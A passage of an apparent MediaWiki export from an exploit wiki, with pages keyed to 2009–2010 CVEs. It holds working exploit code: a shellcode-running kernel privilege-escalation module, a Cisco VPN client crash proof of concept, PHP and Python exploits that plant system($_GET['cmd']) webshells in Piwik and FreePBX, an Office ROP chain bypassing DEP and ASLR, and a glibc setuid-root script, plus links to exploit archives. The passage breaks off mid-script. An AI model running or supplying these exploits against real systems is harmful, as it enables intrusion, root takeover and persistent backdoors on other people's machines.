			PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_PRIVATE | MAP_ANONYMOUS,
			0, 0
		);
	mprotect(func, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
	// weaksauce memcpy so we don't have to #include &lt;string.h&gt;
	printf("Copying %d bytes of shellcode\n", shellcode_size);
	for (i = 0; i &lt; shellcode_size; i++) {
		(char)func[i] = (char)shellcode[i];
	}
	printf("Calling shellcode: 0x%p\n", func);
	//sigtrap();
	func();

	return got_ring0;
}
^
			main.gsub!(/shellcode =/) do
				# split the payload into 16-byte chunks and dump it out as a
				# hex-escaped C string
				%Q|shellcode =\n"#{payload.encoded.scan(/.{,16}/).map{|c|Rex::Text.to_hex(c,"\\x")}.join(%Q|"\n"|)}"|
			end
			main.gsub!(/shellcode_size = 0/, "shellcode_size = #{payload.encoded.length}")
			cparser.parse(main, "main.c")

			asm = cpu.new_ccompiler(cparser, sc).compile

			sc.parse asm
		end

		sc.assemble

		begin
			if sc.kind_of? Metasm::ELF
				elf = sc.encode_string
			else
				foo = sc.encode_string
				elf = Msf::Util::EXE.to_linux_x86_elf(framework, foo)
			end
		rescue
			print_error "Metasm Encoding failed: #{$!}"
			elog "Metasm Encoding failed: #{$!.class} : #{$!}"
			elog "Call stack:\n#{$!.backtrace.join("\n")}"
			return
		end

		#puts Rex::Text.to_hex_dump(foo)
		File.open("payload.bin", "wb") {|fd|
			fd.write elf
		}
		print_status "Writing exploit executable (#{elf.length} bytes)"
		cmd_exec("rm /tmp/sendpage")
		write_file("/tmp/sendpage", elf)
		output = cmd_exec("chmod +x /tmp/sendpage; /tmp/sendpage")
		output.each_line { |line| print_debug line.chomp }
		#cmd_exec("rm /tmp/sendpage")

	end

end


&lt;/pre&gt;</text>
      <sha1>fji5clcgcr23959pyfbtj4py1xmm89i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-2692 Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4權限提升漏洞</title>
    <ns>0</ns>
    <id>665</id>
    <revision>
      <id>896</id>
      <timestamp>2021-04-02T04:03:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Linux Null pointer dereference  This is just the compiled binary of the code available in https://www.exploit-db.com/exploits/9545/  Compiled for education purposes..."</comment>
      <origin>896</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="283" sha1="5bonqcyugb7guq52mx74iy6cene04cj" xml:space="preserve">==INFO==
Linux Null pointer dereference

This is just the compiled binary of the code available in https://www.exploit-db.com/exploits/9545/

Compiled for education purposes

It was compiled under CentOS 4.8

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2009-2692.zip</text>
      <sha1>5bonqcyugb7guq52mx74iy6cene04cj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-2698 Linux kernel before 2.6.19拒絕服務/特權提升漏洞</title>
    <ns>0</ns>
    <id>666</id>
    <revision>
      <id>897</id>
      <timestamp>2021-04-02T04:06:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2009-2698 CVE-2009-2698 compiled for CentOS 4.8 &gt; https://github.com/SecWiki/linux-kernel-exploits/tree/4dca098e7491efc83903494d7c00f24c843aae99/2009/CVE-..."</comment>
      <origin>897</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="688" sha1="qlx3sc0gg28gv1g0be037foagh0a9oi" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2009-2698
CVE-2009-2698 compiled for CentOS 4.8
&gt; https://github.com/SecWiki/linux-kernel-exploits/tree/4dca098e7491efc83903494d7c00f24c843aae99/2009/CVE-2009-2698

# Detail

```
[hacker@localhost ~]$ id
uid=500(hacker) gid=500(hacker) groups=500(hacker) context=user_u:system_r:unconfined_t
[hacker@localhost ~]$ gcc 36108.c  -o exp
[hacker@localhost ~]$ ./exp
sh-3.00# id
uid=0(root) gid=0(root) groups=500(hacker) context=user_u:system_r:unconfined_t
sh-3.00# uname -an
Linux localhost.localdomain 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 i686 i386 GNU/Linux
sh-3.00# 
```

&lt;/pre&gt;

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2009-2698.zip</text>
      <sha1>qlx3sc0gg28gv1g0be037foagh0a9oi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-4118 Cisco VPN Client拒絕服務漏洞</title>
    <ns>0</ns>
    <id>667</id>
    <revision>
      <id>898</id>
      <timestamp>2021-04-02T04:10:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2009-4118 Cisco VPN Client - Integer Overflow Denial of Service  Exploit-DB publication at  https://www.exploit-db.com/exploits/10190/  # Cisco official I..."</comment>
      <origin>898</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7042" sha1="t38wa55mln61dz2pwtrzi4bt4bje0ln" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2009-4118
Cisco VPN Client - Integer Overflow Denial of Service

Exploit-DB publication at  https://www.exploit-db.com/exploits/10190/

# Cisco official Intelligence AlertID 19445 and Credits 

http://tools.cisco.com/security/center/viewAlert.x?alertId=19445

![cve-2009-4118](https://user-images.githubusercontent.com/3140111/40872784-98bb237a-6654-11e8-9a77-7fb94a8edf1d.png)

# Author 
Alex Hernandez aka &lt;em&gt;&lt;a href="https://twitter.com/_alt3kx_" rel="nofollow"&gt;(@\_alt3kx\_)&lt;/a&gt;&lt;/em&gt;

&lt;/pre&gt;

==EXP==
&lt;pre&gt;
/*
Cisco VPN client version 5.0.03.0560
Cisco VPN client Version 5.0.04.0300
Cisco VPN client Version 5.0.05.0290
Cisco VPN client Version 4.8.02.0010 
*/

/* 
 * Cisco VPN Client 0day Integer overflow (DOS) Proof Of Concept Code
 *
 * By Alex Hernandez aka alt3kx (c) November 2009
 *
 * This POC is only for test. If an application read a malformed chars 
 * file like this POC, the application will be crashed.
 *
 * We tested this code on:
 *
 * Windows Vista Bussines SP1 Spanish
 * Windows Vista Home Premium  SP1 English
 * Windows 2000 Server English
 * Windows XP Professional SP3
 *
 * Cisco VPN client version 5.0.03.0560
 * Cisco VPN client Version 5.0.04.0300
 * Cisco VPN client Version 5.0.05.0290
 * Cisco VPN client Version 4.8.02.0010
 * 
 * Compiled on VC++ win32
 *  
 * Friends:
 * sirdarckcat, nitr0us, hkm, crypkey, xDAWN, canit0, chr1x
 *
 * TT &amp; DSRT
 * daSh, p4r4n01ds, darkslaker, beto, motis. 
 *
 * Very special credits to:
 *
 * str0ke (milw0rm.com)
 * rathaus (securiteam.com)
 * FX (Phenoelit.de)
 * dSR! (segfault.es)
 * 0dd (0dd.com)
 * 
 * 
 * PH-Neutral 0x7d9, We hope to see u there intruders
 * 
 * ---------------
 * Report Timeline 
 * ---------------
 * 06/03/2009	The vulnerability was discovered.
 * 07/03/2009	Exploit/PoC code was developed (private).
 * 09/03/2009	Cisco PSIRT was notified about the issue.
 * 11/03/2009	Vendor response asking for details of the testing environment.
 * 12/03/2009	Test scenario explained and sent a PDF document with details.
 * 16/03/2009	Developers/PSIRT confirmed the vulnerability.
 * 19/03/2009	New test scenarios around new versions (CISCO VPN client).
 * 23/03/2009	CISCO PSIRT assing an internal tracking PSIRT-0676131279.
 * 23/03/2009	CISCO PSIRT assing an Bug ID-CSCsz49276.
 * 15/04/2009	New Advisory release (private).
 * 16/04/2009	New PSIRT feedback no ETA avaiable.
 * 23/04/2009	The development team working the fix.
 * 01/05/2009	The development team estimated one month to fix.
 * 01/06/2009	New PSIRT feedback, no ETA available.
 * 29/06/2009	The development team estimated one month to fix.
 * 28/07/2009	The development team working on maitenance release.
 * 28/07/2009	The development team estimated one month to fix.
 * 02/09/2009	New vulnerabilities found on CISCO VPN client.
 * 02/09/2009	The development team can not publish the new version 5.0.6.
 * 02/09/2009	The development team working on maitenance release.
 * 02/09/2009	The development team estimated one month to fix.
 * 10/09/2009	The BETA program should be finished by the end of Oct 
 * and the client posted next month.
 * 07/10/2009	The development team estimated one month to fix.
 * 11/11/2009	New PSIRT feedback RNA avaiable.
 * 19/11/2009	The vulnerability goes public and PSIRT is informed.
 * 19/11/2009	Fix and details will available on CISCO Intellishield Alert &amp; Bug Tool kit.
 * 
 * CISCO Fix and Details:
 * 
 * BugToolKit:
 * http://tools.cisco.com/Support/BugToolKit/search/getBugDetails.do?method=fetchBugDetails&amp;bugId=CSCsz49276
 *
 * Intellishield Alert:
 * http://tools.cisco.com/security/center/viewAlert.x?alertId=19445
 * 
 */
 
#include &lt;windows.h&gt;
#include &lt;winsock.h&gt;
#include &lt;stdio.h&gt;
#pragma comment ( lib, "ws2_32.lib" )
 
int CheckPortUDP( short int nPort )
{
    struct sockaddr_in nSockServer;
 
    WSADATA wsaData;
 
    int lBusy = 0;
    int nSocket;
 
    /* Initialization */
    if( WSAStartup( 0x0101, &amp;wsaData ) == 0 )
    {
        /* Create Socket */
        nSockServer.sin_family      = AF_INET;
        nSockServer.sin_port        = htons( nPort );
        nSockServer.sin_addr.s_addr = inet_addr( "127.0.0.1" );
 
        /* Check UDP Protocol */
        nSocket = socket( AF_INET, SOCK_DGRAM, 0 );
 
        lBusy = ( bind( nSocket, (SOCKADDR FAR *) &amp;nSockServer,
                            sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR );
 
        /* Close Socket if Busy */
        if( lBusy )
            closesocket( nSocket );
 
        /* Close Winsock */
        WSACleanup();
    }
 
    /* Return */
    return( lBusy );
}

int CheckPortTCP( short int nPort )
{
    struct sockaddr_in nSockServer;
 
    WSADATA wsaData;
 
    int lBusy = 0;
    int nSocket;
 
    /* Initialization */
    if( WSAStartup( 0x0101, &amp;wsaData ) == 0 )
    {
        /* Create Socket */
        nSockServer.sin_family      = AF_INET;
        nSockServer.sin_port        = htons( nPort );
        nSockServer.sin_addr.s_addr = inet_addr( "127.0.0.1" );
 
        /* Check TCP Protocol */
        nSocket = socket( AF_INET, SOCK_STREAM, 0 );
 
        lBusy = ( connect( nSocket, (struct sockaddr *) &amp;nSockServer,
                     sizeof( nSockServer ) ) == 0 );
 
        /* Close Socket if Busy */
        if( lBusy )
            closesocket( nSocket );
 
        /* Close Winsock */
        WSACleanup();
    }
 
    /* Return */
    return( lBusy );
}

int main(void)
{

	char szPath[] = "C:\\Program Files\\Cisco Systems\\VPN Client\\cvpnd.exe";
	//uncomment this line for Windows XP Spanish versions
	//char szPath[] = "C:\\Archivos de programa\\Cisco Systems\\VPN Client\\cvpnd.exe";
	char buffer[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	PROCESS_INFORMATION pif;
	STARTUPINFO si;
	ZeroMemory(&amp;si,sizeof(si));
	si.cb = sizeof(si);

	BOOL bRet = CreateProcess(
        szPath,
        buffer,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &amp;si,
        &amp;pif);
	
	system("cls");
	printf("\n .:: Cisco VPN Client 0day Integer overflow (DoS) Proof Of Concept Code ::.\n");
	printf(" .:: By Alex Hernandez aka alt3kx (c) November 2009 .::\n\n");  

	
	/* Check for TCP Port */
 
    if( CheckPortTCP(62514) )
        printf("[+] Cisco VPN Client TCP port listening\t[OK!]\n");
    else
        printf("[+] Cisco VPN Client TCP Port isn't Busy\t[Wrong!]\n");

    /* Check for UDP Port */
 
    if( CheckPortUDP(62514) )
        printf("[+] Cisco VPN Client UDP port listening\t[OK!]\n");
    else
        printf("[+] Cisco VPN Client UDP Port isn't Busy\t[Wrong!]\n");

	if(bRet == FALSE){MessageBox(HWND_DESKTOP,"Unable to start program check the default PATH Cisco VPN Client cvpnd.exe\n","",MB_OK);
    return 1;}

	else if (bRet == TRUE){MessageBox(HWND_DESKTOP,"Attempting exploit Cisco VPN DoS exploit...","",MB_OK);
		printf("\n[+] Few seconds to crash the program...\n");
		printf("[+] Exploit success...\n\n");
	return 1;} 

    CloseHandle(pif.hProcess);
    CloseHandle(pif.hThread);

}
&lt;/pre&gt;</text>
      <sha1>t38wa55mln61dz2pwtrzi4bt4bje0ln</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-4137 Piwik before 0.5 任意代碼執行/文件上傳漏洞</title>
    <ns>0</ns>
    <id>668</id>
    <revision>
      <id>899</id>
      <timestamp>2021-04-02T04:12:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; &lt;?php /* We exploit the CVE-2009-4137 by using a php object injection of a Piwik_Config object The __destruct() function of this object writes the config to the..."</comment>
      <origin>899</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1852" sha1="86t4onv5pj8cw0fw2e09mmc3o9alc0y" xml:space="preserve">==EXP==
&lt;pre&gt;
&lt;?php
/*
We exploit the CVE-2009-4137 by using a php object injection of a Piwik_Config object
The __destruct() function of this object writes the config to the path specified in the pathIniFileUserConfig variable
The content of a config file is always prepended by a php showstopper as seen in the following two code-lines of Config.php

$configFile = "; &lt;?php exit; ?&gt; DO NOT REMOVE THIS LINE\n";
$configFile .= "; file automatically generated or modified by Piwik; you can manually override the default values in global.ini.php by redefining them in this file.\n";

To circumvent this, we use php://filter/write=convert.base64-decode and pre-encode our payload. PHP is nice enough to just skip every character that is not part of the base64 alphabet

We then prepend a single character to correct the padding to our payload and write a simple php webshell.
A request to the piwik server with the cookie then triggers the exploit

(You need to url_encode the Cookie if you use manual requests. The '+' and '/' characters of the base64 alphabet must be encoded)
*/

class Zend_Config {
    protected $_data = array(
        "login" =&gt; "root",
        "password" =&gt; "rootroot",
        "email" =&gt; "root@rootroot.com"
    );
}

class Piwik_Config {
    protected $configFileUpdated = true;
    protected $doWriteFileWhenUpdated = true;
    protected $correctCwd = ".";
    protected $pathIniFileUserConfig = "php://filter/write=convert.base64-decode/resource=/var/www/piwik/webshell.php";
    protected $userConfig = array();

    function __construct() { // 'a' for padding
	$this-&gt;userConfig["a".base64_encode('&lt;?php system($_GET[\'cmd\']); ?&gt;'."\n")] = new Zend_Config;
    }
}

$b64 = base64_encode(serialize(new Piwik_Config));
$urlEncoded = urlencode($b64);
echo "Use this cookie";
echo "PIWIK_SESSID=".$urlEncoded."\n";

?&gt;


&lt;/pre&gt;</text>
      <sha1>86t4onv5pj8cw0fw2e09mmc3o9alc0y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-4660 BigAnt IM Server 2.50 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>669</id>
    <revision>
      <id>900</id>
      <timestamp>2021-04-02T04:14:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2009-4660.zip"</comment>
      <origin>900</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="62zx97umf5shv7mrmsrwap8ati31fzg" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2009-4660.zip</text>
      <sha1>62zx97umf5shv7mrmsrwap8ati31fzg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-5147 dlopen漏洞</title>
    <ns>0</ns>
    <id>670</id>
    <revision>
      <id>901</id>
      <timestamp>2021-04-02T04:17:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; CVE-2009-5147 and CVE-2015-7551 PoC  to run it:  ```` make foo export FOO=./foo.so ruby -v foo.rb ````  with different versions of ruby you should get different..."</comment>
      <origin>901</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="658" sha1="c13dctgotyx7adn0gnoxb8hs7hphtcc" xml:space="preserve">==INFO==
&lt;pre&gt;
CVE-2009-5147 and CVE-2015-7551 PoC

to run it:

````
make foo
export FOO=./foo.so
ruby -v foo.rb
````

with different versions of ruby you should get different results:

````
vpereira@kimura:~/poc&gt; rvm use 2.1.7
vpereira@kimura:~/poc&gt; ruby -v foo.rb
ruby 2.1.7p400 (2015-08-18 revision 51632) [x86_64-linux]
some trash fom your environment variables...

vpereira@kimura:~/poc&gt; rvm use 2.3.0
vpereira@kimura:~/poc&gt; ruby -v foo.rb
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-linux]
CVE-2009-5147 fixed
````

The file ```foo2.rb``` is for the CVE-2015-7551

&lt;/pre&gt;

==POC==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2009-5147.zip</text>
      <sha1>c13dctgotyx7adn0gnoxb8hs7hphtcc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-0426 sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4本地特權提升漏洞</title>
    <ns>0</ns>
    <id>676</id>
    <revision>
      <id>909</id>
      <timestamp>2021-04-03T01:38:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-0426.zip"</comment>
      <origin>909</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="1oeybz4wpfh8qick4lg9y2luuo1fuyt" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-0426.zip</text>
      <sha1>1oeybz4wpfh8qick4lg9y2luuo1fuyt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-1205 pngpread.c in libpng before 1.2.44 and 1.4.x before 1.4.3緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>677</id>
    <revision>
      <id>910</id>
      <timestamp>2021-04-03T01:42:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; Sample exploit using CVE-2010-1205 vulnerability in libpng (&lt;=1.4.2)  gregbook - set of sample programs distributed with libpng sources  generate - generates ma..."</comment>
      <origin>910</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="912" sha1="dxd7pav9uo5lniwdpsgvz2qz9nrsnud" xml:space="preserve">==INFO==
&lt;pre&gt;
Sample exploit using CVE-2010-1205 vulnerability in libpng (&lt;=1.4.2)

gregbook - set of sample programs distributed with libpng sources

generate - generates malicious png file which triggers heap-overflow while reading the file with libpng


steps to reproduce:
./build.sh                  # build all libraries and executables. gregbook/rpng2-x is linked against libpng-1.4.2 (buggy)
./generate/build/generate   # generates xploit.png - malformed png file
cd gregbook/
./rpng2-x ../xploit.png     # run explaple which shows how to use libpng to display png file. Ends with Segmentation fault.


steps to run with fixed libpng version (1.4.3):
in gregbook/Makefile edit line 33:
PNGDIR = ../libpng-1.4.3
in gregbook directory run:
make clean &amp;&amp; make
./rpng2-x ../xploit.png     # opens window with the png file


&lt;/pre&gt;


==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-1205.zip</text>
      <sha1>dxd7pav9uo5lniwdpsgvz2qz9nrsnud</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3333 MS Office 2010 RTF Header堆棧溢出漏洞</title>
    <ns>0</ns>
    <id>493</id>
    <revision>
      <id>695</id>
      <timestamp>2021-03-27T03:04:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: MS Office 2010 RTF Header Stack Overflow Vulnerability Exploit # Date: 7/3/2011 # Author: Snake ( Shahriyar.j &lt; at &gt; gmail ) # Version: MS Offic..."</comment>
      <origin>695</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3845" sha1="153c4oyungfs2rdi2jbgo7uglh9sc8t" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: MS Office 2010 RTF Header Stack Overflow Vulnerability
Exploit
# Date: 7/3/2011
# Author: Snake ( Shahriyar.j &lt; at &gt; gmail )
# Version: MS Office &lt;= 2010
# Tested on: MS Office 2010 ( 14.0.4734.1000) - Windows 7
# CVE : CVE-2010-3333

# This is the exploit I wrote for Abysssec "The Arashi" article.
# It gracefully bypass DEP/ASLR in MS Office 2010,
# and we named this method "Ikazuchi DEP/ASRL Bypass" : &gt;
# unfortunately msgr3en.dll loads a few seconds after opining office,
# so just need to open open Office , and then open exploit after a few
second and saw a nice calc.
#
# The Arashi : http://abysssec.com/files/The_Arashi.pdf
               http://www.exploit-db.com/download_pdf/17469

# me : twitter.com/ponez
# aslo check here for Persian docs of this methods and more :
http://www.0days.ir/article/

Exploit:  http://www.exploit-db.com/sploits/cve-2011-3333_exploit.doc


#
# and the Rop :

3F2CB9E0    POP ECX
            RETN
        # HeapCreate() IAT = 3F10115C

3F389CA5    MOV EAX,DWORD PTR DS:[ECX]
            RETN
        # EAX == HeapCreate() Address

3F39AFCF    CALL EAX
            RETN
        # Call HeapCreate() and Create a Executable Heap :D
        # after this call, EAX contain our Heap Address.

0x3F2CB9E0    POP ECX
        RETN
        # pop 0x00008000 into ECX

0x3F39CB46    ADD EAX,ECX
        POP ESI
        RETN
        # add ECX to EAX and instead of calling HeapAlloc,
        # now EAX point to the RWX Heap :D

0x3F2CB9E0     POP ECX
        RETN
        # pop 0x3F3B3DC0 into ECX, it is a writable address.

0x3F2233CC     MOV DWORD PTR DS:[ECX],EAX
        RETN
        # storing our RWX Heap Address into 0x3F3B3DC0 ( ECX ) for
further use ;)

0x3F2D59DF     POP EAX
        ADD DWORD PTR DS:[EAX],ESP
        RETN
        # pop 0x3F3B3DC4 into EAX , it is writable address with zero!
        # then we add ESP to the Zero which result in storing ESP into
that address,
        # we need ESP address for copying shellcode ( which stores in
Stack ),
        # and we have to get it dynamically at run-time, now with my
tricky instruction, we have it!


0x3F2F18CC    POP EAX
        RETN
        # pop 0x3F3B3DC4 ( ESP address ) into EAX


0x3F2B745E     MOV ECX,DWORD PTR DS:[EAX]
        RETN
        # now ECX point to nearly offset of Stack.

0x3F39795E    POP EDX
        RETN
        # pop 0x00000024 into EDX

0x3F39CB44    ADD ECX,EDX
        ADD EAX,ECX
        POP ESI
        RETN
        # add 0x24 to ECX ( Stack address )

0x3F398267     MOV EAX,ECX
        RETN
        # EAX = ECX ; )

0x3F3A16DE    MOV DWORD PTR DS:[ECX],EAX
        XOR EAX,EAX
        POP ESI
        RETN
        # mov EAX ( Stack Address + 24 = Current ESP value ) into the
current Stack Location,
        # and the popping it into ESI ! now ESI point where shellcode
stores in stack :D

0x3F398267     MOV EAX,ECX
        RETN
        # EAX = ECX ; )

3F2CB9E0    POP ECX
        RETN
        # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX

0x3F389CA5     MOV EAX,DWORD PTR DS:[ECX]
        RETN
        # now EAX point to our RWX Heap

0x3F2B0A7C     XCHG EAX,EDI
        RETN 4
        # EDI = Our RWX Heap Address


3F2CB9E0    POP ECX
        RETN
        # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX
 

0x3F389CA5     MOV EAX,DWORD PTR DS:[ECX]
        RETN
        # now EAX point to our RWX Heap

0x3F38BEFB     ADD AL,58
        RETN
        # just skip some junks ; )

3F2CB9E0    POP ECX
        RETN
        # pop 0x00000080 into ECX ( 0x80 * 4 = 0x200 = Copy lent )

3F3441B4    REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]
        POP EDI
        POP ESI
        RETN
        # Copy shellcode from stack into RWX Heap


3F39AFCF     CALL EAX
        RETN
        # KABOOM !!!

Exploit:  http://www.exploit-db.com/sploits/cve-2011-3333_exploit.doc
&lt;/pre&gt;</text>
      <sha1>153c4oyungfs2rdi2jbgo7uglh9sc8t</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3490 FreePBX 2.8.0任意文件創建漏洞</title>
    <ns>0</ns>
    <id>678</id>
    <revision>
      <id>911</id>
      <timestamp>2021-04-03T01:45:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; import requests import random import string import sys   # Original advisory : http://www.exploit-db.com/exploits/15098/   print("devloop exploit for FreePBX &lt;=..."</comment>
      <origin>911</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1601" sha1="co9okpgkvarqhsggvue9mukxmptz1qa" xml:space="preserve">==EXP==
&lt;pre&gt;
import requests
import random
import string
import sys
 
# Original advisory : http://www.exploit-db.com/exploits/15098/
 
print("devloop exploit for FreePBX &lt;= 2.8.0 (CVE-2010-3490)")
if len(sys.argv) != 4:
    print("Usage: {0} &lt;url_to_freepbx_admin_directory&gt; &lt;username&gt; &lt;password&gt;")
    sys.exit()
 
BASE = sys.argv[1]
USER = sys.argv[2]
PASS = sys.argv[3]
KEYW = "devloop"
 
if not BASE.endswith("/"):
    BASE += "/"
 
sess = requests.session()
creds = (USER, PASS)
 
r = sess.get(BASE + "config.php", auth=creds)
if "Logged in:" in r.content:
    print("[+] Connection successful")
else:
    print("[!] Unable to login... check credentials and url")
    sys.exit()
 
data = {
    'action': 'recorded',
    'display': 'recordings',
    'usersnum': '../../../../../var/www/html/admin/{0}'.format(KEYW),
    'rname': "".join([random.choice(string.hexdigits) for _ in xrange(10)]),
    'Submit': 'Save'
    }
 
content = "&lt;?php system($_GET['cmd']); ?&gt;"
files = {
        'ivrfile': ('backdoor.php', content, 'application/octet-stream')
        }
hdrs = {"referer": BASE + "config.php?type=setup&amp;display=recordings"}
 
r = sess.post(BASE + "config.php?type=setup&amp;display=recordings",
        data=data,
        files=files,
        auth=creds,
        headers=hdrs)
 
print("[i] Testing shell at address {0}{1}-ivrrecording.php".format(BASE, KEYW))
r = requests.get(BASE + KEYW + "-ivrrecording.php?cmd=uname+-a", auth=creds)
if r.status_code != 200:
    print("[-] Received HTTP code {0} for this url".format(r.status_code))
else:
    print("HTTP 200 OK")
    print r.content

&lt;/pre&gt;</text>
      <sha1>co9okpgkvarqhsggvue9mukxmptz1qa</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3600 Oracle Database Server 11.1.0.7 and 11.2.0.1 and Enterprise Manager Grid Control 10.2.0.5任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>679</id>
    <revision>
      <id>912</id>
      <timestamp>2021-04-03T01:47:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-3600.zip"</comment>
      <origin>912</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="hhc1svcqliucsta647svessegwusbd5" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-3600.zip</text>
      <sha1>hhc1svcqliucsta647svessegwusbd5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3847 elf/dl-load.c 本地特權提升漏洞</title>
    <ns>0</ns>
    <id>680</id>
    <revision>
      <id>913</id>
      <timestamp>2021-04-03T01:49:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; CVE-2010-3847 script ==================== Meant to automate the exploit discussed in [http://marc.info/?l=full-disclosure&amp;m=128776663124692&amp;w=2].  Tested on Cen..."</comment>
      <origin>913</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="24634" sha1="dr2c73d3ogpkcz9noxira57yzpdw69f" xml:space="preserve">==INFO==
&lt;pre&gt;
CVE-2010-3847 script
====================
Meant to automate the exploit discussed in
[http://marc.info/?l=full-disclosure&amp;m=128776663124692&amp;w=2].  Tested on
CentOS 5 x86.

The DSO it outputs is compiled from the following code:
```c
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}
```

Usage
-----
Download it, put it somewhere executable, and run it.

Gotchas
-------
`/tmp` and wherever `ping` is have to be on the same filesystem.  If not,
adjust the paths accordingly.

&lt;/pre&gt;

==CVE-2010-3847.sh==
&lt;pre&gt;
#!/bin/sh

set -e

echo "Opening file descriptor 3 to /tmp/.exploit/target"
mkdir /tmp/.exploit
ln /bin/ping /tmp/.exploit/target
exec 3&lt; /tmp/.exploit/target
rm -rf /tmp/.exploit/
ls -l /proc/self/fd/3

echo "Writing malicious DSO to /tmp/.exploit"
printf "\177\105\114\106\001\001\001\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\003\000\001\000\000\000\060\003\000\000\064\000\000\000" &gt;&gt;/tmp/.exploit
printf "\150\007\000\000\000\000\000\000\064\000\040\000\004\000\050\000" &gt;&gt;/tmp/.exploit
printf "\032\000\027\000\001\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\260\004\000\000\260\004\000\000\005\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\020\000\000\001\000\000\000\260\004\000\000\260\024\000\000" &gt;&gt;/tmp/.exploit
printf "\260\024\000\000\004\001\000\000\014\001\000\000\006\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\020\000\000\002\000\000\000\314\004\000\000\314\024\000\000" &gt;&gt;/tmp/.exploit
